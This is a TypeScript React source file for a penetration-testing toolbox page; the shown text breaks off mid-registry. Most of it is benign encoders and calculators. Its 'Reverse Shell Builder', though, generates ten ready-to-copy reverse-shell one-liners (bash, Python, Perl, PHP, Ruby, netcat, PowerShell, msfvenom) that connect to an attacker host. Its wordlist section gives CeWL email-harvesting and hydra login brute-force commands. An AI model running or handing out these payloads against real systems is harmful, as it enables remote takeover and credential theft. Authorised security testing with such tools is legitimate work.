"use client";

import { useState, useEffect, useMemo } from "react";
import { MethodologyTool } from "@/components/tools/methodology";
import { ClipboardDocumentIcon, CheckIcon } from "@heroicons/react/24/outline";

// ---- shared ----
function CopyBtn({ text, label = "Copy" }: { text: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500); }}
      className="flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-2 py-1 text-[10px] text-zinc-400 hover:text-zinc-200 transition-colors"
    >
      {copied ? <CheckIcon className="h-3 w-3 text-green-400" /> : <ClipboardDocumentIcon className="h-3 w-3" />}
      {copied ? "Copied" : label}
    </button>
  );
}

// ============================================================
// 1. ENCODING
// ============================================================
function Base64Tool() {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  return (
    <ToolPanel title="Base64" desc="Encode / decode text — handles UTF-8.">
      <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="Input…" className={taCls} />
      <Btns>
        <button onClick={() => setOutput(btoa(unescape(encodeURIComponent(input))))} className={primary}>Encode</button>
        <button onClick={() => { try { setOutput(decodeURIComponent(escape(atob(input)))); } catch { setOutput("Invalid base64"); } }} className={secondary}>Decode</button>
      </Btns>
      {output && <Out value={output} />}
    </ToolPanel>
  );
}

function UrlEncodeTool() {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  return (
    <ToolPanel title="URL Encode" desc="Percent-encode / decode URI components.">
      <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="https://target.com/?q=..." className={taCls} />
      <Btns>
        <button onClick={() => setOutput(encodeURIComponent(input))} className={primary}>Encode</button>
        <button onClick={() => { try { setOutput(decodeURIComponent(input)); } catch { setOutput("Invalid URL encoding"); } }} className={secondary}>Decode</button>
        <button onClick={() => setOutput(input.replace(/[^A-Za-z0-9]/g, (c) => "%" + c.charCodeAt(0).toString(16).toUpperCase().padStart(2, "0")))} className={secondary}>Double-Encode</button>
      </Btns>
      {output && <Out value={output} />}
    </ToolPanel>
  );
}

function HexTool() {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const toHex = () => setOutput(Array.from(new TextEncoder().encode(input)).map((b) => b.toString(16).padStart(2, "0")).join(""));
  const fromHex = () => {
    try {
      const bytes = input.replace(/\s+/g, "").match(/.{1,2}/g)?.map((b) => parseInt(b, 16)) || [];
      setOutput(new TextDecoder().decode(new Uint8Array(bytes)));
    } catch { setOutput("Invalid hex"); }
  };
  return (
    <ToolPanel title="Hex" desc="Bytes ↔ hexadecimal.">
      <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="text or hex string…" className={taCls} />
      <Btns>
        <button onClick={toHex} className={primary}>To Hex</button>
        <button onClick={fromHex} className={secondary}>From Hex</button>
      </Btns>
      {output && <Out value={output} />}
    </ToolPanel>
  );
}

function HtmlEscapeTool() {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const escape = () => setOutput(input.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]!)));
  const unescape = () => setOutput(input.replace(/&(amp|lt|gt|quot|#39);/g, (m) => ({ "&amp;": "&", "&lt;": "<", "&gt;": ">", "&quot;": '"', "&#39;": "'" }[m]!)));
  return (
    <ToolPanel title="HTML Escape" desc="Escape / unescape HTML entities.">
      <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="<script>alert(1)</script>" className={taCls} />
      <Btns>
        <button onClick={escape} className={primary}>Escape</button>
        <button onClick={unescape} className={secondary}>Unescape</button>
      </Btns>
      {output && <Out value={output} />}
    </ToolPanel>
  );
}

function Rot13Tool() {
  const [input, setInput] = useState("");
  const out = useMemo(() => input.replace(/[a-zA-Z]/g, (c) => String.fromCharCode((c <= "Z" ? 90 : 122) >= c.charCodeAt(0) + 13 ? c.charCodeAt(0) + 13 : c.charCodeAt(0) - 13)), [input]);
  return (
    <ToolPanel title="ROT13" desc="Caesar shift by 13. Useful for CTF text obfuscation.">
      <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="Hello, World!" className={taCls} />
      {out && <Out value={out} />}
    </ToolPanel>
  );
}

// ============================================================
// 2. HASH
// ============================================================
function HashTool() {
  const [input, setInput] = useState("");
  const [hashes, setHashes] = useState<Record<string, string>>({});
  const compute = async () => {
    const data = new TextEncoder().encode(input);
    const results: Record<string, string> = {};
    for (const algo of ["SHA-1", "SHA-256", "SHA-384", "SHA-512"]) {
      const buf = await crypto.subtle.digest(algo, data);
      results[algo] = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
    }
    setHashes(results);
  };
  return (
    <ToolPanel title="Hash" desc="SHA-1/256/384/512. Use hashcat / john for MD5 + bcrypt + NTLM.">
      <input value={input} onChange={(e) => setInput(e.target.value)} placeholder="text to hash…" className={inCls} />
      <Btns><button onClick={compute} className={primary}>Compute</button></Btns>
      {Object.entries(hashes).map(([algo, h]) => (
        <div key={algo}>
          <p className="mb-1 text-[10px] font-semibold uppercase tracking-wider text-zinc-500">{algo}</p>
          <Out value={h} />
        </div>
      ))}
    </ToolPanel>
  );
}

function XorTool() {
  const [input, setInput] = useState("");
  const [key, setKey] = useState("");
  const [output, setOutput] = useState("");
  const xor = () => {
    if (!key) return setOutput("Provide a key");
    const out = Array.from(input).map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))).join("");
    setOutput(btoa(unescape(encodeURIComponent(out))));
  };
  return (
    <ToolPanel title="XOR" desc="XOR text with a repeating key. Output as base64.">
      <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="plaintext…" className={taCls} />
      <input value={key} onChange={(e) => setKey(e.target.value)} placeholder="key" className={inCls} />
      <Btns><button onClick={xor} className={primary}>XOR + Base64</button></Btns>
      {output && <Out value={output} />}
    </ToolPanel>
  );
}

// ============================================================
// 3. TOKENS
// ============================================================
function JWTTool() {
  const [token, setToken] = useState("");
  const [decoded, setDecoded] = useState<{ header: unknown; payload: unknown } | null>(null);
  const [error, setError] = useState("");
  const decode = () => {
    try {
      const [h, p] = token.split(".");
      const header = JSON.parse(atob(h.replace(/-/g, "+").replace(/_/g, "/")));
      const payload = JSON.parse(atob(p.replace(/-/g, "+").replace(/_/g, "/")));
      setDecoded({ header, payload });
      setError("");
    } catch { setError("Invalid JWT"); setDecoded(null); }
  };
  return (
    <ToolPanel title="JWT Decoder" desc="Header + payload. Signature NOT verified. Check `alg` for `none` exploit.">
      <textarea value={token} onChange={(e) => setToken(e.target.value)} placeholder="eyJ..." className={taCls} />
      <Btns><button onClick={decode} className={primary}>Decode</button></Btns>
      {error && <p className="text-xs text-red-400">{error}</p>}
      {decoded && (
        <div className="space-y-2">
          <div>
            <p className="mb-1 text-[10px] font-semibold uppercase tracking-wider text-zinc-500">Header</p>
            <pre className="rounded border border-zinc-700 bg-zinc-950 p-3 font-mono text-xs text-zinc-300 overflow-auto">{JSON.stringify(decoded.header, null, 2)}</pre>
          </div>
          <div>
            <p className="mb-1 text-[10px] font-semibold uppercase tracking-wider text-zinc-500">Payload</p>
            <pre className="rounded border border-zinc-700 bg-zinc-950 p-3 font-mono text-xs text-zinc-300 overflow-auto">{JSON.stringify(decoded.payload, null, 2)}</pre>
          </div>
        </div>
      )}
    </ToolPanel>
  );
}

function UuidTool() {
  const [count, setCount] = useState(5);
  const [uuids, setUuids] = useState<string[]>([]);
  const gen = () => {
    const arr: string[] = [];
    for (let i = 0; i < count; i++) arr.push(crypto.randomUUID());
    setUuids(arr);
  };
  return (
    <ToolPanel title="UUID v4 Generator" desc="Cryptographically random RFC 4122 UUIDs.">
      <div className="flex gap-2 items-center">
        <input type="number" value={count} onChange={(e) => setCount(Math.max(1, Math.min(50, +e.target.value)))} className={`${inCls} w-24`} />
        <button onClick={gen} className={primary}>Generate</button>
      </div>
      {uuids.length > 0 && <Out value={uuids.join("\n")} />}
    </ToolPanel>
  );
}

function TimestampTool() {
  const [ts, setTs] = useState(Math.floor(Date.now() / 1000).toString());
  const [date, setDate] = useState(new Date().toISOString());
  const parsedFromTs = useMemo(() => {
    const n = parseInt(ts, 10);
    if (isNaN(n)) return null;
    return new Date(n * (n > 1e12 ? 1 : 1000));
  }, [ts]);
  const fromDate = () => {
    try {
      const d = new Date(date);
      if (!isNaN(d.getTime())) setTs(Math.floor(d.getTime() / 1000).toString());
    } catch { /* ignore */ }
  };
  return (
    <ToolPanel title="Timestamp" desc="Unix epoch ↔ ISO 8601 (UTC).">
      <div>
        <p className="mb-1 text-[10px] uppercase tracking-wider text-zinc-500">Unix epoch (s or ms)</p>
        <input value={ts} onChange={(e) => setTs(e.target.value)} className={inCls} />
        {parsedFromTs && <p className="mt-1 text-[11px] font-mono text-zinc-400">→ {parsedFromTs.toISOString()} · {parsedFromTs.toLocaleString()}</p>}
      </div>
      <div>
        <p className="mb-1 text-[10px] uppercase tracking-wider text-zinc-500">ISO / human</p>
        <input value={date} onChange={(e) => setDate(e.target.value)} className={inCls} />
        <button onClick={fromDate} className={`${primary} mt-1`}>→ epoch</button>
      </div>
    </ToolPanel>
  );
}

// ============================================================
// 4. JSON / REGEX
// ============================================================
function JsonTool() {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [error, setError] = useState("");
  const pretty = (indent = 2) => {
    try { setOutput(JSON.stringify(JSON.parse(input), null, indent)); setError(""); } catch (e) { setError((e as Error).message); }
  };
  const minify = () => {
    try { setOutput(JSON.stringify(JSON.parse(input))); setError(""); } catch (e) { setError((e as Error).message); }
  };
  return (
    <ToolPanel title="JSON Formatter" desc="Pretty-print / minify / validate JSON.">
      <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder='{"a":1}' className={`${taCls} h-32`} />
      <Btns>
        <button onClick={() => pretty(2)} className={primary}>Pretty (2)</button>
        <button onClick={() => pretty(4)} className={secondary}>Pretty (4)</button>
        <button onClick={minify} className={secondary}>Minify</button>
      </Btns>
      {error && <p className="text-xs text-red-400">{error}</p>}
      {output && <Out value={output} />}
    </ToolPanel>
  );
}

function RegexTool() {
  const [pattern, setPattern] = useState("");
  const [flags, setFlags] = useState("g");
  const [input, setInput] = useState("");
  const result = useMemo(() => {
    if (!pattern || !input) return null;
    try {
      const re = new RegExp(pattern, flags);
      const matches = Array.from(input.matchAll(new RegExp(pattern, flags.includes("g") ? flags : flags + "g")));
      return { ok: true, count: matches.length, matches: matches.slice(0, 50).map((m) => m[0]), valid: re };
    } catch (e) { return { ok: false, error: (e as Error).message }; }
  }, [pattern, flags, input]);
  return (
    <ToolPanel title="Regex Tester" desc="Live-test JavaScript flavour regex (PCRE-ish).">
      <div className="flex gap-2">
        <input value={pattern} onChange={(e) => setPattern(e.target.value)} placeholder="\\d{3}-\\d{4}" className={`${inCls} flex-1 font-mono`} />
        <input value={flags} onChange={(e) => setFlags(e.target.value)} placeholder="gim" className={`${inCls} w-20 font-mono`} />
      </div>
      <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="text to search…" className={`${taCls} h-32`} />
      {result && !result.ok && <p className="text-xs text-red-400">{result.error}</p>}
      {result && result.ok && (
        <div>
          <p className="text-[11px] text-zinc-400 mb-1">{result.count} matches</p>
          <Out value={(result.matches || []).join("\n") || "(no matches)"} />
        </div>
      )}
    </ToolPanel>
  );
}

// ============================================================
// 5. NETWORK
// ============================================================
function CidrTool() {
  const [cidr, setCidr] = useState("192.168.1.0/24");
  const info = useMemo(() => {
    const m = cidr.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)\/(\d+)$/);
    if (!m) return null;
    const ip = (+m[1] << 24) | (+m[2] << 16) | (+m[3] << 8) | +m[4];
    const prefix = +m[5];
    if (prefix < 0 || prefix > 32) return null;
    const mask = prefix === 0 ? 0 : ~((1 << (32 - prefix)) - 1) >>> 0;
    const network = (ip & mask) >>> 0;
    const broadcast = (network | (~mask >>> 0)) >>> 0;
    const total = prefix === 32 ? 1 : 2 ** (32 - prefix);
    const usable = total > 2 ? total - 2 : total;
    const toIp = (n: number) => `${(n >>> 24) & 255}.${(n >>> 16) & 255}.${(n >>> 8) & 255}.${n & 255}`;
    const toMask = () => toIp(mask >>> 0);
    return {
      network: toIp(network),
      broadcast: toIp(broadcast),
      first: toIp(network + (total > 2 ? 1 : 0)),
      last: toIp(broadcast - (total > 2 ? 1 : 0)),
      mask: toMask(),
      wildcard: toIp((~mask) >>> 0),
      total,
      usable,
    };
  }, [cidr]);
  return (
    <ToolPanel title="CIDR Calculator" desc="IPv4 subnet math.">
      <input value={cidr} onChange={(e) => setCidr(e.target.value)} placeholder="10.0.0.0/16" className={`${inCls} font-mono`} />
      {info && (
        <div className="rounded border border-zinc-700 bg-zinc-950 p-3 grid grid-cols-2 gap-x-6 gap-y-1.5 text-[11px] font-mono">
          {[
            ["Network",      info.network],
            ["Broadcast",    info.broadcast],
            ["First host",   info.first],
            ["Last host",    info.last],
            ["Subnet mask",  info.mask],
            ["Wildcard",     info.wildcard],
            ["Total IPs",    info.total.toLocaleString()],
            ["Usable hosts", info.usable.toLocaleString()],
          ].map(([k, v]) => (
            <div key={k} className="flex justify-between gap-3"><span className="text-zinc-600">{k}</span><span className="text-zinc-200">{v}</span></div>
          ))}
        </div>
      )}
    </ToolPanel>
  );
}

// ============================================================
// 6. PASSWORD
// ============================================================
function PasswordTool() {
  const [len, setLen] = useState(20);
  const [opts, setOpts] = useState({ lower: true, upper: true, digit: true, sym: true });
  const [out, setOut] = useState("");
  const gen = () => {
    const pool =
      (opts.lower ? "abcdefghijklmnopqrstuvwxyz" : "") +
      (opts.upper ? "ABCDEFGHIJKLMNOPQRSTUVWXYZ" : "") +
      (opts.digit ? "0123456789" : "") +
      (opts.sym   ? "!@#$%^&*()-_=+[]{};:,.<>/?" : "");
    if (!pool) return setOut("Select at least one charset");
    const bytes = new Uint32Array(len);
    crypto.getRandomValues(bytes);
    setOut(Array.from(bytes).map((n) => pool[n % pool.length]).join(""));
  };
  return (
    <ToolPanel title="Password Generator" desc="Cryptographically random — uses crypto.getRandomValues.">
      <div className="flex gap-2 items-center">
        <label className="text-[11px] text-zinc-400">Length</label>
        <input type="number" value={len} onChange={(e) => setLen(Math.max(4, Math.min(256, +e.target.value)))} className={`${inCls} w-24`} />
      </div>
      <div className="flex flex-wrap gap-3">
        {(["lower", "upper", "digit", "sym"] as const).map((k) => (
          <label key={k} className="flex items-center gap-1.5 text-[11px] text-zinc-400 cursor-pointer">
            <input type="checkbox" checked={opts[k]} onChange={(e) => setOpts({ ...opts, [k]: e.target.checked })} className="accent-fuchsia-500" />
            {k}
          </label>
        ))}
      </div>
      <Btns><button onClick={gen} className={primary}>Generate</button></Btns>
      {out && <Out value={out} />}
    </ToolPanel>
  );
}

// ============================================================
// 7. PAYLOADS
// ============================================================
const REV_SHELL_TEMPLATES: { id: string; label: string; build: (h: string, p: string) => string }[] = [
  { id: "bash",       label: "Bash",        build: (h, p) => `bash -c 'bash -i >& /dev/tcp/${h}/${p} 0>&1'` },
  { id: "bash-b64",   label: "Bash (b64)",  build: (h, p) => `bash -c "$(echo -n 'bash -i >& /dev/tcp/${h}/${p} 0>&1' | base64)" | base64 -d | bash` },
  { id: "python",     label: "Python3",     build: (h, p) => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'` },
  { id: "perl",       label: "Perl",        build: (h, p) => `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
  { id: "php",        label: "PHP",         build: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
  { id: "ruby",       label: "Ruby",        build: (h, p) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${h}","${p}");loop{c.print "$ ";cmd=c.gets;(IO.popen(cmd,"r"){|io|c.print io.read}) rescue nil}'` },
  { id: "nc-mkfifo",  label: "Netcat mkfifo", build: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f` },
  { id: "powershell", label: "PowerShell",  build: (h, p) => `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${h}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"` },
  { id: "msfvenom-php", label: "msfvenom (php)", build: (h, p) => `msfvenom -p php/reverse_php LHOST=${h} LPORT=${p} -f raw > rev.php` },
  { id: "msfvenom-elf", label: "msfvenom (elf)", build: (h, p) => `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f elf > rev` },
];

function RevShellTool() {
  const [host, setHost] = useState("10.10.10.10");
  const [port, setPort] = useState("4444");
  return (
    <ToolPanel title="Reverse Shell Builder" desc="Drop-in payloads. Replace HOST + PORT, start listener with `nc -lvnp PORT`.">
      <div className="flex gap-2">
        <input value={host} onChange={(e) => setHost(e.target.value)} placeholder="ATTACKER_IP" className={`${inCls} flex-1 font-mono`} />
        <input value={port} onChange={(e) => setPort(e.target.value)} placeholder="4444" className={`${inCls} w-28 font-mono`} />
      </div>
      <div className="rounded border border-zinc-800 bg-zinc-950 px-3 py-2">
        <p className="mb-1 text-[10px] uppercase tracking-wider text-zinc-500">Listener (attacker)</p>
        <code className="font-mono text-xs text-green-300">nc -lvnp {port}</code>
      </div>
      <div className="space-y-2">
        {REV_SHELL_TEMPLATES.map((t) => {
          const cmd = t.build(host, port);
          return (
            <div key={t.id} className="rounded border border-zinc-800 bg-zinc-950 overflow-hidden">
              <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800">
                <span className="text-[10px] font-semibold text-fuchsia-400">{t.label}</span>
                <CopyBtn text={cmd} />
              </div>
              <pre className="p-3 overflow-x-auto text-xs text-green-300 font-mono whitespace-pre-wrap break-all">{cmd}</pre>
            </div>
          );
        })}
      </div>
    </ToolPanel>
  );
}

const USER_AGENTS = [
  { label: "Chrome 125 (Mac)",     ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" },
  { label: "Chrome 125 (Windows)", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" },
  { label: "Firefox 124 (Linux)",  ua: "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" },
  { label: "Safari iPhone 17",     ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1" },
  { label: "Googlebot",            ua: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
  { label: "Bingbot",              ua: "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" },
  { label: "curl/8.5.0",           ua: "curl/8.5.0" },
  { label: "Burp Suite Pro",       ua: "Mozilla/5.0 (compatible; Burp Suite Pro)" },
  { label: "sqlmap",               ua: "sqlmap/1.8 (https://sqlmap.org)" },
  { label: "Nuclei (default)",     ua: "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))" },
  { label: "Empty (suspicious)",   ua: "" },
];

function UaTool() {
  return (
    <ToolPanel title="User-Agent Library" desc="Copy a UA string. Fingerprint-tools detect mismatched UA + TLS easily.">
      <div className="space-y-1">
        {USER_AGENTS.map((u) => (
          <div key={u.label} className="rounded border border-zinc-800 bg-zinc-950 px-3 py-2 flex items-center gap-3">
            <span className="min-w-[160px] text-[10px] font-semibold text-fuchsia-400">{u.label}</span>
            <code className="flex-1 font-mono text-[11px] text-zinc-400 truncate">{u.ua || "(empty)"}</code>
            <CopyBtn text={u.ua} />
          </div>
        ))}
      </div>
    </ToolPanel>
  );
}

// ============================================================
// 8. WORDLIST BUILDER (CeWL-style)
// ============================================================
function CewlTool() {
  const [input, setInput] = useState("");
  const [minLen, setMinLen] = useState(5);
  const [maxLen, setMaxLen] = useState(32);
  const [lower, setLower] = useState(true);
  const [withNumbers, setWithNumbers] = useState(false);
  const [appendYears, setAppendYears] = useState(false);
  const [appendSymbols, setAppendSymbols] = useState(false);
  const [output, setOutput] = useState<{ words: string[]; total: number; uniq: number }>({ words: [], total: 0, uniq: 0 });
  const STOP = new Set("the a an and or but if then else when at by for from in into of on or so to with as is are was were be been being do does did have has had not no it its this that these those you your our we their they i he she his her about all also any can could over under up down out off only into more most some such which who whom what why how".split(/\s+/));

  const build = () => {
    // Strip HTML
    const text = input.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, " ")
                      .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, " ")
                      .replace(/<[^>]+>/g, " ")
                      .replace(/&[a-z]+;/gi, " ");

    const re = withNumbers ? /[A-Za-z0-9]+/g : /[A-Za-z]+/g;
    const counts = new Map<string, number>();
    for (const w of text.match(re) || []) {
      let word = w;
      if (lower) word = word.toLowerCase();
      if (word.length < minLen || word.length > maxLen) continue;
      if (STOP.has(word.toLowerCase())) continue;
      counts.set(word, (counts.get(word) || 0) + 1);
    }
    let words = Array.from(counts.entries()).sort((a, b) => b[1] - a[1]).map(([w]) => w);

    // CeWL-style mangling
    if (appendYears) {
      const ys = [new Date().getFullYear(), new Date().getFullYear() - 1, 2024, 2023];
      words = words.flatMap((w) => [w, ...ys.map((y) => w + y)]);
    }
    if (appendSymbols) {
      const sy = ["!", "@", "123", "1", "#", "$"];
      words = words.flatMap((w) => [w, ...sy.map((s) => w + s)]);
    }

    setOutput({ words, total: text.split(/\s+/).length, uniq: counts.size });
  };

  return (
    <ToolPanel
      title="Wordlist Builder (CeWL-style)"
      desc="Paste raw HTML or text from target site → generate custom wordlist for password brute-force. Mirrors CeWL behaviour."
    >
      <textarea
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="curl -sk https://target.com | tee local.html  →  paste contents here"
        className={`${taCls} h-40`}
      />

      <div className="flex flex-wrap gap-3 items-center text-[11px]">
        <label className="flex items-center gap-1.5">
          Min<input type="number" value={minLen} onChange={(e) => setMinLen(+e.target.value)} className={`${inCls} w-16`} />
        </label>
        <label className="flex items-center gap-1.5">
          Max<input type="number" value={maxLen} onChange={(e) => setMaxLen(+e.target.value)} className={`${inCls} w-16`} />
        </label>
        <label className="flex items-center gap-1.5 cursor-pointer text-zinc-400">
          <input type="checkbox" checked={lower} onChange={(e) => setLower(e.target.checked)} className="accent-fuchsia-500" /> lowercase
        </label>
        <label className="flex items-center gap-1.5 cursor-pointer text-zinc-400">
          <input type="checkbox" checked={withNumbers} onChange={(e) => setWithNumbers(e.target.checked)} className="accent-fuchsia-500" /> include numbers
        </label>
        <label className="flex items-center gap-1.5 cursor-pointer text-zinc-400">
          <input type="checkbox" checked={appendYears} onChange={(e) => setAppendYears(e.target.checked)} className="accent-fuchsia-500" /> append years
        </label>
        <label className="flex items-center gap-1.5 cursor-pointer text-zinc-400">
          <input type="checkbox" checked={appendSymbols} onChange={(e) => setAppendSymbols(e.target.checked)} className="accent-fuchsia-500" /> append symbols (! @ 123…)
        </label>
      </div>

      <Btns>
        <button onClick={build} className={primary}>Build Wordlist</button>
        {output.words.length > 0 && (
          <button
            onClick={() => {
              const blob = new Blob([output.words.join("\n")], { type: "text/plain" });
              const a = document.createElement("a");
              a.href = URL.createObjectURL(blob);
              a.download = "wordlist.txt";
              a.click();
            }}
            className={secondary}
          >Download .txt</button>
        )}
      </Btns>

      {output.words.length > 0 && (
        <>
          <p className="text-[11px] text-zinc-500">
            {output.uniq.toLocaleString()} unique words from {output.total.toLocaleString()} total · {output.words.length.toLocaleString()} entries after mangling
          </p>
          <Out value={output.words.slice(0, 500).join("\n") + (output.words.length > 500 ? `\n... (+${output.words.length - 500} more — download for full list)` : "")} />
        </>
      )}

      {/* Real CeWL reference */}
      <div className="rounded border border-zinc-800 bg-zinc-950 p-3 space-y-2">
        <p className="text-[10px] uppercase tracking-wider text-fuchsia-400">Real CeWL — on Kali / Docker</p>
        <p className="text-[11px] text-zinc-400">
          CeWL spiders a live site and generates a wordlist. The form above mimics offline behaviour
          (paste HTML you already fetched). Use the binary below when you need spidering, depth-control,
          authenticated crawl, email harvesting, or metadata extraction.
        </p>

        <div className="space-y-1.5">
          {[
            { label: "Install", cmd: "sudo apt install cewl   # Kali / Debian\nbrew install cewl       # macOS via homebrew" },
            { label: "Docker (no install)", cmd: "docker run --rm digininja/cewl:latest -d 2 -m 5 -w out.txt https://target.com" },
            { label: "Basic spider", cmd: "cewl -d 2 -m 5 -w wordlist.txt https://target.com" },
            { label: "Include numbers", cmd: "cewl -d 2 -m 5 --with-numbers -w wordlist.txt https://target.com" },
            { label: "Show counts (frequency)", cmd: "cewl -d 2 -m 5 -c https://target.com" },
            { label: "Email harvesting", cmd: "cewl -d 2 -e --email_file emails.txt https://target.com" },
            { label: "Metadata (PDF/DOC)", cmd: "cewl -d 2 -a --meta_file meta.txt https://target.com" },
            { label: "Authenticated crawl", cmd: 'cewl -d 2 -m 5 --auth_user admin --auth_pass pass --auth_type basic https://target.com' },
            { label: "Through a proxy", cmd: "cewl -d 2 --proxy_host 127.0.0.1 --proxy_port 8080 https://target.com" },
            { label: "Custom UA", cmd: 'cewl -d 2 -u "Mozilla/5.0 ..." https://target.com' },
            { label: "Mangle (capitalise / append digits) via john", cmd: "john --wordlist=wordlist.txt --rules=Jumbo --stdout > mangled.txt" },
            { label: "Use against login (hydra)", cmd: 'hydra -L users.txt -P wordlist.txt -t 4 target.com https-post-form "/login:username=^USER^&password=^PASS^:Invalid"' },
          ].map((c) => (
            <div key={c.label} className="rounded border border-zinc-800 bg-zinc-900 overflow-hidden">
              <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800">
                <span className="text-[10px] font-semibold text-fuchsia-400">{c.label}</span>
                <CopyBtn text={c.cmd} />
              </div>
              <pre className="px-3 py-2 font-mono text-[11px] text-green-300 whitespace-pre-wrap break-all">{c.cmd}</pre>
            </div>
          ))}
        </div>

        <div className="flex flex-wrap gap-1.5 pt-1">
          <a href="https://www.kali.org/tools/cewl/" target="_blank" rel="noopener noreferrer"
             className="rounded border border-zinc-700 bg-zinc-800 px-2 py-0.5 text-[10px] text-zinc-400 hover:text-fuchsia-300 hover:border-fuchsia-700">
            ↗ kali.org/tools/cewl
          </a>
          <a href="https://github.com/digininja/CeWL" target="_blank" rel="noopener noreferrer"
             className="rounded border border-zinc-700 bg-zinc-800 px-2 py-0.5 text-[10px] text-zinc-400 hover:text-fuchsia-300 hover:border-fuchsia-700">
            ↗ github.com/digininja/CeWL
          </a>
          <a href="https://digi.ninja/projects/cewl.php" target="_blank" rel="noopener noreferrer"
             className="rounded border border-zinc-700 bg-zinc-800 px-2 py-0.5 text-[10px] text-zinc-400 hover:text-fuchsia-300 hover:border-fuchsia-700">
            ↗ author site
          </a>
        </div>
      </div>
    </ToolPanel>
  );
}

// ============================================================
// shared widgets
// ============================================================
const taCls = "w-full rounded border border-zinc-700 bg-zinc-800 p-3 text-xs font-mono text-zinc-100 placeholder-zinc-600 outline-none focus:border-fuchsia-600 h-28 resize-none";
const inCls = "w-full rounded border border-zinc-700 bg-zinc-800 px-3 py-1.5 text-xs text-zinc-100 placeholder-zinc-600 outline-none focus:border-fuchsia-600";
const primary = "rounded bg-fuchsia-700 px-3 py-1.5 text-xs font-medium text-white hover:bg-fuchsia-600 transition-colors";
const secondary = "rounded border border-zinc-700 bg-zinc-800 px-3 py-1.5 text-xs font-medium text-zinc-400 hover:bg-zinc-700 transition-colors";

function ToolPanel({ title, desc, children }: { title: string; desc?: string; children: React.ReactNode }) {
  return (
    <div className="space-y-3">
      {desc && <p className="text-[11px] text-zinc-500">{desc}</p>}
      {children}
    </div>
  );
}
function Btns({ children }: { children: React.ReactNode }) { return <div className="flex flex-wrap gap-2">{children}</div>; }
function Out({ value }: { value: string }) {
  return (
    <div className="rounded border border-zinc-700 bg-zinc-950 overflow-hidden">
      <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800">
        <span className="text-[10px] uppercase tracking-wider text-zinc-500">Output</span>
        <CopyBtn text={value} />
      </div>
      <pre className="p-3 font-mono text-xs text-zinc-300 break-all whitespace-pre-wrap overflow-x-auto max-h-96">{value}</pre>
    </div>
  );
}

// ============================================================
// REGISTRY
// ============================================================
type ToolEntry = { id: string; label: string; group: string; component: React.ReactNode };

const TOOLS: ToolEntry[] = [
  // Encoding
  { id: "base64",   label: "Base64",       group: "Encoding", component: <Base64Tool /> },
  { id: "urlenc",   label: "URL Encode",   group: "Encoding", component: <UrlEncodeTool /> },
  { id: "hex",      label: "Hex",          group: "Encoding", component: <HexTool /> },
  { id: "html",     label: "HTML Escape",  group: "Encoding", component: <HtmlEscapeTool /> },
  { id: "rot13",    label: "ROT13",        group: "Encoding", component: <Rot13Tool /> },
  // Hash / crypto
  { id: "hash",     label: "Hash",         group: "Crypto",   component: <HashTool /> },
  { id: "xor",      label: "XOR",          group: "Crypto",   component: <XorTool /> },
  // Tokens
